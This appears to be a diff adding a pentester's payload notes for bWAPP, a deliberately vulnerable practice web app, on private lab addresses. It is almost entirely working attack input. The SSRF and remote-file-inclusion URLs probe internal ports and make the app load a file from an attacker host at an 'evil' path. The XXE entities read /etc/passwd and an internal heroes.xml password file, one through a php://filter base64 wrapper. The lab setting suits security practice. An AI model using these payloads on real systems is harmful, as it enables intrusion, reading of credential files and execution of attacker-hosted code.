@@ -1,0 +1,34 @@
+http://192.168.204.130/bWAPP/ssrf.php
+http://192.168.204.130/bWAPP/rlfi.php?language=lang_en.php&action=go
+http://192.168.204.130/bWAPP/xxe-1.php
+
+http://127.0.0.1:21/lang_en.php
+http://127.0.0.1:22/lang_en.php
+http://127.0.0.1:80/lang_en.php
+http://127.0.0.1:443/lang_en.php
+
+file:///etc/passwd
+
+http://192.168.204.130/bWAPP/rlfi.php?language=http://192.168.204.128/kali.html&action=go
+
+http://192.168.204.128/evil/ssrf-1.txt
+http://192.168.204.130/bWAPP/rlfi.php?language=http://192.168.204.128/evil/ssrf-1.txt&action=go&ip=192.168.204.130
+http://192.168.204.130/bWAPP/rlfi.php?language=http://192.168.204.128/evil/ssrf-1.txt&action=go&ip=127.0.0.1
+http://192.168.204.130/bWAPP/rlfi.php?language=http://192.168.204.128/evil/ssrf-1.txt&action=go&ip=127.0.0.1
+http://192.168.204.130/bWAPP/rlfi.php?language=http://192.168.204.128/evil/ssrf-1.txt&action=go&ip=192.168.1.58
+
+
+
+# Accesses a file on the internal network (1)
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [<!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY bWAPP SYSTEM "file:///etc/passwd">]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
+
+# Web pages returns some characters that break the XML schema > use the PHP base64 encoder filter to return an XML schema friendly version of the page!
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [<!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml">]>
+<reset><login>&bWAPP;</login><secret>blah</secret></reset>
